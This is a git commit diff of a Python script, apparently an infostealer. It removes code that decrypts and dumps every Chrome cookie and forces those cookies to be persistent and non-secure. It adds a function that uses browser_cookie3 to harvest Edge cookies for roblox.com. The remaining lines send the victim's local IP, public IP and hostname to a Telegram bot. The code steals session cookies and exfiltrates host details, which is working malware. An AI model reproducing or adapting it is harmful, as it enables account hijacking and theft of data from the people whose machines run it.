2543ff9cd902703e84ae79a4f71d26af0f1026d4
321 blinikidzhon <nbalaev231@gmail.com>
2023-03-09 20:30:44 +0100

    added function getCookiesFromDomain

--- main.py
+++ main.py
@@ -4,104 +4,29 @@ from requests import get
 from PIL import ImageGrab
 import os
 import random
-import json
-import base64
-import sqlite3
-import shutil
-from datetime import datetime, timedelta
-import win32crypt
-from Crypto.Cipher import AES
-import zipfile
+import browser_cookie3
 
+def getCookiesFromDomain(domain,cookieName=''):
 
+    Cookies={}
+    chromeCookies = list(browser_cookie3.edge())
 
-def zip_dir(path, ziph):
-    # ziph is zipfile handle
-    for root, dirs, files in os.walk(path):
-        for file in files:
-            ziph.write(os.path.join(root, file))
+    for cookie in chromeCookies:
 
+        if (domain in cookie.domain):
+            Cookies[cookie.name]=cookie.value
 
-
-def get_chrome_datetime(chromedate):
-    """Return a `datetime.datetime` object from a chrome format datetime
-    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
-    if chromedate != 86400000000 and chromedate:
+    if(cookieName!=''):
         try:
-            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
-        except Exception as e:
-            print(f"Error: {e}, chromedate: {chromedate}")
-            return chromedate
-    else:
-        return ""
-
-def get_encryption_key():
-    local_state_path = os.path.join(os.environ["USERPROFILE"],
-                                    "AppData", "Local", "Google", "Chrome",
-                                    "User Data", "Local State")
-    with open(local_state_path, "r", encoding="utf-8") as f:
-        local_state = f.read()
-        local_state = json.loads(local_state)
-
-
-    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-
-    key = key[5:]
-
-    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-
-def decrypt_data(data, key):
-    try:
-        iv = data[3:15]
-        data = data[15:]
-        cipher = AES.new(key, AES.MODE_GCM, iv)
-        return cipher.decrypt(data)[:-16].decode()
-    except:
-        try:
-            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
+            return Cookies[cookieName]
         except:
+            return {}
+    else:
+        return Cookies
 
-            return ""
+print(getCookiesFromDomain("roblox.com", ""))
 
-def main():
 
-    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                            "Google", "Chrome", "User Data", "Default", "Network","Cookies")
-
-    filename = "Cookies.db"
-    if not os.path.isfile(filename):
-        shutil.copyfile(db_path, filename)
-
-    db = sqlite3.connect(filename)
-    cursor = db.cursor()
-    cursor.execute("""
-    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
-    FROM cookies""")
-
-    key = get_encryption_key()
-    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
-        if not value:
-            decrypted_value = decrypt_data(encrypted_value, key)
-        else:
-            decrypted_value = value
-        print(f"""
-        Host: {host_key}
-        Cookie name: {name}
-        Cookie value (decrypted): {decrypted_value}
-        Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
-        Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
-        Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
-        ===============================================================
-        """)
-
-        cursor.execute("""
-        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
-        WHERE host_key = ?
-        AND name = ?""", (decrypted_value, host_key, name))
-
-    db.commit()
-
-    db.close()
 
 
 
@@ -128,12 +53,3 @@ chat_id = "1104502854"
 text = (f"local ip = {local_ip} ,public ip = {public_ip} ,hostname = {hostname} ")
 url_req = "https://api.telegram.org/bot" + token + "/sendMessage" + "?chat_id=" + chat_id + "&text=" + text
 results = requests.get(url_req)
-print(results.json())
-
-if __name__ == "__main__":
-    zipf = zipfile.ZipFile(f'{randname}.zip', 'w', zipfile.ZIP_DEFLATED)
-    zip_dir('C:\\Users\\User\\PycharmProjects\\pythonProject\\venv\\Scripts', zipf)
-    zipf.close()
-    with open("output.txt", "w") as f:
-        f.write(main())
-        .close()
